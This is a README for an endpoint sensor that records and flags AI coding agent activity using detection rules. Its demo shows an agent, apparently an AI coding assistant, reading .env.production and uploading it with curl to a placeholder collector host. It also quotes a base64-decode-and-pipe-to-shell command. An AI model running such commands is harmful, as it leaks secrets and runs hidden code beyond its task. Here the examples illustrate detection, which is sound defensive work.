<p align="center">
  <img src="./assets/readme/hero.svg" width="100%"
       alt="auspex, an endpoint sensor for AI coding agent activity. A real scan of one agent transcript turns a read of .env.production and a curl upload of that file into one high-severity chain finding: secret-file access followed by data-bearing egress.">
</p>

<p align="center">
  <a href="https://go.dev"><img src="https://img.shields.io/badge/Go-1.26.5%2B-00ADD8?style=flat-square&logo=go&logoColor=white" alt="Go 1.26.5 or newer"></a>
  <a href="LICENSE"><img src="https://img.shields.io/badge/License-Apache%202.0-475569?style=flat-square" alt="Apache 2.0 license"></a>
  <a href="#install"><img src="https://img.shields.io/badge/Platforms-macOS%20%7C%20Linux%20%7C%20Windows-475569?style=flat-square" alt="macOS, Linux, Windows"></a>
  <a href="docs/schema/v0.2.0/"><img src="https://img.shields.io/badge/Record%20schema-v0.2.0-E3A84C?style=flat-square" alt="Record schema v0.2.0"></a>
</p>

---

AI coding agents run shell commands, read and write files, reach the network, and
invoke MCP servers on developer workstations and CI runners. They do it
continuously, semi-autonomously, and largely without leaving anything a security
team can read. Every vendor persists its own session format, exposes its own hook
contract, and answers to no shared schema.

**auspex is an endpoint sensor for that activity.** It attaches to the agents
already installed on a machine, converts everything they do into one normalized
event vocabulary, evaluates that stream against a local CEL rule engine, and
emits structured records you can alert on, investigate, and hand off.

| Question | Mechanism |
| --- | --- |
| What are the agents on this endpoint doing right now? | Synchronous hooks and generated plugins across 25 blocking-capable agents, plus an OTLP/HTTP receiver |
| What did they already do, before anyone was watching? | Read-only reconstruction from 11 parser-backed on-disk session stores, with no prior instrumentation |
| Which of those actions should someone look at? | 51 shipped CEL rules across 12 categories, including 6 multi-step sequence chains |
| Can a specific action be stopped before it executes? | Opt-in enforce mode returning each host's native deny response at its pre-action gate |

Detection runs entirely on the endpoint: no cloud dependency, and no telemetry
egress except to sinks you configure. Everything ships monitor-only; blocking
requires an explicit per-rule opt-in.

---

## Try it

Install, then look at what is already on the machine. Both commands below are
read-only: they install no hooks and change no agent configuration.

```sh
go install github.com/Sri-Krishna-V/auspex/cmd/auspex@latest
auspex agents
```

```text
AGENT                     CONFIG  ARTIFACTS                           LIVE    WIRED  OBSERVED
Claude Code               yes     found transcripts                   hooks   no     2026-08-09T11:45:32Z
Codex                     yes     found transcripts                   hooks   no     2026-08-09T11:45:32Z
Gemini CLI                yes     found transcripts                   hooks   no     never
Cursor                    yes     found transcripts; deferred SQLite  hooks   no     2026-08-09T11:45:33Z
GitHub Copilot CLI        yes     none found; deferred SQLite         hooks   no     2026-08-09T11:45:34Z
OpenCode                  yes     none found; deferred SQLite         plugin  no     never
```

<sub>Real output, 6 of 12 detected agents. The trailing <code>NEXT</code> column, which prints the exact install command per agent, is omitted here for width.</sub>

`WIRED` is read from configuration. `OBSERVED` is read from auspex's own
execution record: the last time a hook callback actually ran for that agent on
this machine. `never` means no hook execution was recorded here, not that the
agent never ran.

Now scan what those agents already did. No hook, no instrumentation, no
cooperation from the vendor:

```sh
auspex scan
```

Against a four-line Claude Code transcript in which the agent reads
`.env.production` and then uploads it with `curl`, that produces three findings.
The third is the one a human cares about, because no single action in it is
conclusive on its own:

```json
{
  "record_type": "finding",
  "schema_version": "0.2.0",
  "rule_id": "chain.secret_read_then_egress",
  "rule_version": "1.6",
  "title": "Secret-file access followed by data-bearing egress",
  "severity": "high",
  "confidence": "high",
  "cited_event_ids": ["a1#1", "a2#0"],
  "observed_event_type": "command.exec",
  "observed_command": "curl --data-binary @/workspace/acme-api/.env.production https://collector.example.invalid/ingest",
  "source_agent": "claude-code",
  "source_type": "artifact",
  "session_id": "sess-readme-demo",
  "tags": ["attack.t1048", "attack.t1552", "attack.t1567"],
  "evidence_refs": [
    {"artifact_type": "claude_jsonl", "line": 2, "json_pointer": "/message/content/1"},
    {"artifact_type": "claude_jsonl", "line": 4, "json_pointer": "/message/content/0"}
  ],
  "ruleset_digest": "sha256:794f7b9f…",
  "project_path_hash": "sha256:6780eeb5…",
  "endpoint": {"hostname": "…", "os": "…", "arch": "…", "username": "…", "uid": "…"}
}
```

<sub>Real <code>auspex scan</code> output. Keys reordered for reading; endpoint identity, absolute artifact paths, and digests elided.</sub>

Every finding cites the events it was derived from, and every event cites the
artifact file, line, and JSON pointer it came from. `auspex timeline` replays the
same artifacts chronologically without evaluating any rules:

```text
session sess-readme-demo [claude-code]
  project: /workspace/acme-api
  span:    2026-08-09T09:14:02Z .. 2026-08-09T09:14:31Z
  events:  7
  time                  event              actor      detail
  2026-08-09T09:14:02Z  prompt.user        user       fix the failing deploy job
  2026-08-09T09:14:07Z  message.assistant  assistant  Checking the deploy config.
  2026-08-09T09:14:07Z  file.read          assistant  /workspace/acme-api/.env.production
  2026-08-09T09:14:08Z  tool.result        tool       -
  2026-08-09T09:14:31Z  command.exec       assistant  curl --data-binary @/workspace/acme-api/.env…
```

<sub>Real output. Per-row <code>[evidence]</code> file paths and the <code>session.start</code>/<code>session.end</code> rows are omitted here for width.</sub>

---

## How it works

Three dissimilar capture surfaces fan into a single normalization stage.
Everything downstream of that point is source-agnostic: a rule author writes one
CEL expression and it applies to a live Codex hook payload, a Gemini OTLP log
record, and a Claude Code transcript from last quarter without modification.

<p align="center">
  <img src="./assets/readme/pipeline.svg" width="100%"
       alt="Three capture surfaces feed one pipeline. Hooks and plugins are synchronous and can deny; the OTLP receiver and the on-disk scanner observe only. All three converge on one normalization stage emitting a closed event vocabulary, then one detection stage running 51 CEL rules and 6 sequence chains, then NDJSON records at schema v0.2.0. A deny response returns only along the hook path.">
</p>

### Capture

The surfaces are not interchangeable. They differ in latency, completeness, and
whether they can intervene.

| Surface | Timing | Can block | Bounded by |
| --- | --- | --- | --- |
| Hooks and generated plugins<br>`auspex hook install` | Synchronous, before the tool runs | Yes, at 25 of 27 agents | Whether the host publishes a real pre-action gate |
| OTLP/HTTP receiver<br>`auspex collect` | Asynchronous, after the fact | No | What the agent chooses to export |
| On-disk session artifacts<br>`auspex scan`, `auspex timeline` | Retrospective, no prior setup | No | What the agent chose to persist |

At-rest reconstruction is not disk or memory acquisition. It cannot recover an
action the agent never wrote down, and auspex never executes anything it finds.

### Normalization

Every source maps into a closed vocabulary: `command.exec`, `file.read`,
`file.write`, `file.delete`, `network.indicator`, and `tool.call`. These are
alternatives, not layers. A recognized shell request becomes `command.exec`, not
an additional `tool.call`.

<p align="center">
  <img src="./assets/readme/classifier.svg" width="100%"
       alt="A tool request from a hook, an OTLP record, or an artifact is typed by two questions. If the tool name and argument shape are not verified for that source, it becomes tool.call. If they are, the structured shape decides: a shell or process request becomes command.exec, a file access or change becomes file.read, file.write, or file.delete, a known network call becomes network.indicator, and anything ambiguous stays tool.call.">
</p>

The classifier is deliberately conservative. It promotes an action to a specific
type only when the source's own structured fields support it, and never infers
intent from prose, command output, or free-form previews. When a safe specific
mapping is unavailable it falls back to `tool.call` rather than guessing, and a
`confidence` field records how directly the source supported the mapping. MCP is
a facet rather than a category: a `tool.call` retains `mcp_server` and
`mcp_tool`.

Command events also carry an `opacity_score` and the `opacity_reasons` behind
it, so one layer of wrapping (`bash -c "base64 -d p | sh"`) reports as 3
rather than as a single opaque string. A score of `0` is a real claim that
auspex parsed the command and saw everything it does; a command it could not
read carries **no score at all**, because emitting `0` there would fabricate a
completeness auspex never had.

### Detection

Every sensor feeds the same per-event core, so a hook callback and a six-month-old
transcript take an identical path. Contract validation comes first, and a failure
is returned to the sensor rather than detected on.

<p align="center">
  <img src="./assets/readme/detection.svg" width="100%"
       alt="One normalized event is checked against the contract; a failure is rejected and returned to the sensor. A valid event is emitted as an event record and then evaluated by 51 CEL rules in 12 categories, 6 sequence chains held in a per-session window, and an indicator accumulator folded across the run. Events, findings, indicators, and diagnostics leave as NDJSON, and a failure to emit any of them taints the run.">
</p>

Rules are CEL expressions over the normalized event. They match against parsed
structure, not raw text: a rule can read `event.command` directly, but the parsed
`shell_commands` view is preferred when a decision depends on executable
semantics, since raw input can contain comments, quoted examples, and other text
a shell would never run.

Sequence rules correlate ordered steps within one session, using a persisted store
behind hooks and an in-memory tracker everywhere else. That is what turns two
individually unremarkable actions into the chain finding shown above.

---

## Blocking is opt-in

auspex never executes or cancels a tool itself. It answers a question the host
asked at its own pre-action gate, and the host decides what to do with the
answer. Two independent conditions must hold before that answer is a deny.

<p align="center">
  <img src="./assets/readme/enforcement.svg" width="100%"
       alt="A rule match becomes a deny only when the matched rule sets enforce true with the hook in enforce mode, and every record for that run emitted successfully. Monitor mode, a detection-only rule, or a record that failed to emit all fall through to no override, leaving the host's normal permission flow in place.">
</p>

The second condition is the safety property worth understanding: **a deny must
never outrun its operator record.** If any finding fails to emit during a run,
the enforcement decision is poisoned and cannot be restored by a later clean
event. auspex would rather let an action through than block it silently and leave
no auditable trace of why. For the same reason the enforcement channel is
uncapped while detection findings are subject to `max_matches`, so a finding quota
can never become a policy bypass.

The deny itself is generic: rule identifiers and evidence stay out of the control
channel returned to the agent, though the decision is not concealed.

Enabling `--enforce` is not sufficient on its own. **The shipped catalog is
entirely monitor-only**, and an enforce-mode install refuses to proceed unless at
least one enabled rule actually sets `enforce: true`. Turning a shipped detection
into a block is a deliberate act: copy its complete [YAML](rules/) into a
controlled operator directory, keep the id, add the flag, and bump the version:

```sh
auspex rules check --rules-dir ./auspex-policy
auspex hook install --agent codex --emit all \
  --rules-dir ./auspex-policy --enforce
```

> **Hook trust:** requirements vary by agent and scope. For a Codex user hook,
> review and trust its current definition in `/hooks` (CLI) or Settings > Hooks
> (app), including after changes such as `--enforce`. Codex hooks installed with
> `--managed` are trusted by policy. `hook status` verifies configuration, not
> execution or delivery. See the
> [deployment guide](docs/deployment.md#hook-trust-and-activation) for other
> agents and scopes.

---

## The rule catalog

51 rules across 12 behavioral categories, embedded in the binary.

| Category | Rules | Category | Rules | Category | Rules |
| --- | ---: | --- | ---: | --- | ---: |
| `secrets` | 8 | `privilege` | 6 | `impact` | 4 |
| `exec` | 6 | `chains` | 6 | `recon` | 3 |
| `persistence` | 6 | `exfil` | 4 | `tamper` | 3 |
| `integrity` | 2 | `source_control` | 2 | `lateral` | 1 |

`scan`, `collect`, `hook EVENT`, `hook install`, and `rules check|list|test`
accept `--rules-dir DIR` (repeatable) to add operator rules or replace embedded
rules by id; `--no-builtin-rules` gives an operator-only catalog. A replacement
is never silent: the run warns with the replaced ids, and every record carries a
`ruleset_digest` over the rule files that actually loaded, so a swapped catalog
is visible on the wire instead of looking like a healthy endpoint.

See the [built-in rule catalog](docs/rule-catalog.md) for what each rule detects,
and [docs/rules.md](docs/rules.md) for writing your own.

---

## Records and handoff

Everything auspex observes leaves as versioned NDJSON. Six record types share one
envelope and one schema version, and one file feeds every consumer.

<p align="center">
  <img src="./assets/readme/handoff.svg" width="100%"
       alt="One NDJSON record file at schema v0.2.0 feeds three consumers: auspex ship batches it to HTTP and advances its state only on a 2xx, auspex timeline replays it chronologically without evaluating rules, and auspex case build collects a case's findings, the events they cite, and a SHA-256 manifest that auspex case verify re-hashes file by file.">
</p>

| Record | What it is |
| --- | --- |
| `event` | One normalized action |
| `finding` | A rule match, with the `cited_event_ids` it was derived from |
| `indicator` | A run-level aggregate folded across the run |
| `enforcement` | The computed policy decision, including why it was *not* a deny |
| `diagnostic` | Parse and evaluation problems |
| `scan_summary` | Coverage of a scan run |

Records go to stdout, a local file, or an HTTP sink. `auspex ship` tails a local
file and batches it to HTTP, advancing its state only on `2xx`, which makes
delivery at-least-once across outages.

`auspex case build` produces the handoff artifact: a case's findings, the events
their `cited_event_ids` name, any case-scoped enforcement decisions, and a
`manifest.json` of per-file SHA-256 digests that `auspex case verify` re-checks.
Identical ordered inputs produce identical record files. Evidence entries carry
separate hashes for the source bytes and the stored bytes, so a redacted copy can
never be mistaken for the original artifact.

The manifest establishes internal consistency, not authenticity. An unsigned
bundle does not prove where it came from or that it is complete.

---

## Commands

| Group | Commands | Purpose |
| --- | --- | --- |
| Inventory and investigation | `agents`, `scan`, `timeline` | Read-only discovery, artifact scanning, session reconstruction |
| Live capture | `hook install`, `hook status`, `hook uninstall`, `collect` | Wire and inspect hooks; run the OTLP receiver |
| Record delivery | `ship` | Tail an NDJSON file and forward batches over HTTP |
| Rule development | `rules check`, `rules list`, `rules test` | Validate, enumerate, and test the effective catalog |
| Case bundles | `case build`, `case verify` | Curate and integrity-check a portable handoff |

Run `auspex --help`, or `auspex help <command>` for flags.

---

## Install

[Download a release](https://github.com/Sri-Krishna-V/auspex/releases) for macOS,
Linux, or Windows on amd64 or arm64; each release includes SHA-256 checksums. Or
install with Go 1.26.5 or newer:

```sh
go install github.com/Sri-Krishna-V/auspex/cmd/auspex@latest
```

<details>
<summary>Build a static binary from a checkout</summary>

macOS or Linux:

```sh
CGO_ENABLED=0 go build -trimpath -o auspex ./cmd/auspex
```

Windows PowerShell:

```powershell
$env:CGO_ENABLED = "0"
go build -trimpath -o auspex.exe ./cmd/auspex
```

</details>

---

## Documentation

- [Agent coverage](docs/agent-coverage.md): supported artifacts, live capture,
  enforcement, and known gaps, per agent.
- [Event model](docs/event-model.md): normalization, action types, correlation,
  opacity markers, and MCP fields.
- [CLI reference](docs/cli.md): commands, flags, records, sinks, and exit codes.
- [Live capture](docs/live-capture.md): hook and OTLP setup.
- [Deployment](docs/deployment.md): install scope, trust, fleet rollout, and
  output delivery.
- [Enforcement](docs/enforcement.md): blocking semantics and failure behavior.
- [Rules](docs/rules.md): custom rule format, CEL fields, tests, and sequences.
- [Built-in rules](docs/rule-catalog.md): shipped detection coverage.
- [Record schemas](docs/schema/v0.2.0/): JSON Schemas for the current wire format.

## Scope and limits

The [coverage matrix](docs/agent-coverage.md) documents support and known gaps
per agent, including deferred stores, fidelity limits, and root overrides. Native
Windows uses vendor-defined profile and AppData paths; WSL uses a separate Linux
home. auspex never executes agents or commands found in artifacts, and it makes
outbound requests only to configured HTTP sinks.

At-rest reconstruction is not disk or memory acquisition and cannot recover
activity an agent did not persist. Findings are rule matches, not proof of
compromise. Case-bundle manifests establish internal consistency; unsigned
bundles do not prove source authenticity or completeness.

## Security

Records can retain sensitive endpoint and agent context after redaction. See
[SECURITY.md](SECURITY.md) for the threat model and private vulnerability
reporting.

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md) for the development workflow, CI gates,
and the package layering that `internal/archguard` enforces.

## License

Apache License 2.0. See [LICENSE](LICENSE).
